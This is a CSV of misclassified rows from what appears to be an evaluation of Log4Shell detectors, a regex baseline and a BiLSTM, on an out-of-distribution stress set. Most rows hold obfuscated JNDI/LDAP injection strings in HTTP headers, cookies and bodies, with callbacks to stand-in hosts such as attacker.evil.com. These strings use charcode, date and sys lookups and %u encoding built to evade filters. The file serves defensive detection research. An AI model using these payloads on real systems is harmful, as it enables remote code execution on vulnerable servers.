model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
Regex Baseline,ood_stress_test.csv,OOD-900286,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900286,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1 trace_id=benign-ood-900286,0,1,0.95,0.7,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900260,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900260,warn unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900260,0,1,0.95,0.7,false_positive_keyword_only,benign_unit_test_fixture,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900191,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900191,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900191,0,1,0.95,0.7,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900056,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}; sid=ood900056,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}; sid=ood900056,1,0,0.45,0.7,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900081,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}&request_id=ood-900081 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}&request_id=ood-900081 http/1.1 host: victim.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900033,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}&request_id=ood-900033 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}&request_id=ood-900033 http/1.1 host: victim.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900140,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}; sid=ood900140,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}; sid=ood900140,1,0,0.45,0.7,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900163,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900163,warn unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900163,0,1,0.95,0.7,false_positive_keyword_only,benign_unit_test_fixture,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900107,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.107 | X-Api-Version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.107 | x-api-version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace},1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900132,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}; sid=ood900132,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}; sid=ood900132,1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900130,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}"",""host"":""lab-callback.example.org""}",1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900264,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900264,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1 trace_id=benign-ood-900264,0,1,0.95,0.7,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900125,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}&request_id=ood-900125 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}&request_id=ood-900125 http/1.1 host: victim.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900239,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900239,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1 trace_id=benign-ood-900239,0,1,0.95,0.7,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900010,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}"",""host"":""evil.example""}",1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900060,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}; sid=ood900060,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}; sid=ood900060,1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900108,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}; sid=ood900108,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}; sid=ood900108,1,0,0.45,0.7,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900026,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d"",""host"":""attacker.evil.com""}",1,0,0.45,0.7,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900253,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup,0,1,0.95,0.7,false_positive_keyword_only,benign_fragmented_tutorial_text,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900090,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}"",""host"":""callback.local""}",1,0,0.45,0.7,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900206,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900206,info tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900206,0,1,0.95,0.7,false_positive_keyword_only,benign_fragmented_tutorial_text,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900192,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900192,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900192,0,1,0.95,0.7,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900067,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.67 | X-Api-Version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.67 | x-api-version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode},1,0,0.45,0.7,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900215,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900215,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1 trace_id=benign-ood-900215,0,1,0.95,0.7,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900280,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900280,info tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900280,0,1,0.95,0.7,false_positive_keyword_only,benign_fragmented_tutorial_text,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,ood_stress_test.csv,OOD-900229,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup,0,1,0.95,0.7,false_positive_keyword_only,benign_fragmented_tutorial_text,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900167,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900167,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1 trace_id=benign-ood-900167,0,1,0.9999008178710938,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900100,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D; sid=ood900100,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d; sid=ood900100,1,0,0.00033893517684191465,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900036,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}; sid=ood900036,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}; sid=ood900036,1,0,0.00034716789377853274,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900048,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}; sid=ood900048,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}; sid=ood900048,1,0,0.0003458862192928791,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900044,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}; sid=ood900044,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}; sid=ood900044,1,0,0.00034702723496593535,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900004,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D; sid=ood900004,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d; sid=ood900004,1,0,0.00033890496706590056,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900216,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900216,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1 trace_id=benign-ood-900216,0,1,0.9998968839645386,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900213,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1,0,1,0.9998962879180908,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900040,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://attacker.evil.com/date-fragment}; sid=ood900040,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://attacker.evil.com/date-fragment}; sid=ood900040,1,0,0.00034646232961677015,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900288,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900288,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1 trace_id=benign-ood-900288,0,1,0.9999042749404907,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900080,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}; sid=ood900080,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}; sid=ood900080,1,0,0.00034597297781147063,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900024,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}; sid=ood900024,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}; sid=ood900024,1,0,0.00034588214475661516,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900261,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1,0,1,0.9999039173126221,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900020,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}; sid=ood900020,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}; sid=ood900020,1,0,0.00034702723496593535,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900240,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900240,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1 trace_id=benign-ood-900240,0,1,0.999901294708252,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900076,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D; sid=ood900076,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d; sid=ood900076,1,0,0.0003389104676898569,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900237,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1,0,1,0.9999005794525146,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900136,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://lab-callback.example.org/date-fragment}; sid=ood900136,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://lab-callback.example.org/date-fragment}; sid=ood900136,1,0,0.00034646232961677015,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900128,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}; sid=ood900128,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}; sid=ood900128,1,0,0.00034599064383655787,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900165,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1,0,1,0.9998999834060669,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900016,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://evil.example/date-fragment}; sid=ood900016,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://evil.example/date-fragment}; sid=ood900016,1,0,0.0003464621549937874,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900238,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900238,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1 trace_id=benign-ood-900238,0,1,0.999901294708252,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900116,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}; sid=ood900116,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}; sid=ood900116,1,0,0.0003470274095889181,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900168,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900168,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1 trace_id=benign-ood-900168,0,1,0.9999008178710938,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900104,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}; sid=ood900104,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}; sid=ood900104,1,0,0.00034598915954120457,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900092,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}; sid=ood900092,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}; sid=ood900092,1,0,0.00034702708944678307,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900263,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900263,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1 trace_id=benign-ood-900263,0,1,0.9999043941497803,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900189,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1,0,1,0.9999011754989624,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900096,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}; sid=ood900096,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}; sid=ood900096,1,0,0.0003458847932051867,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
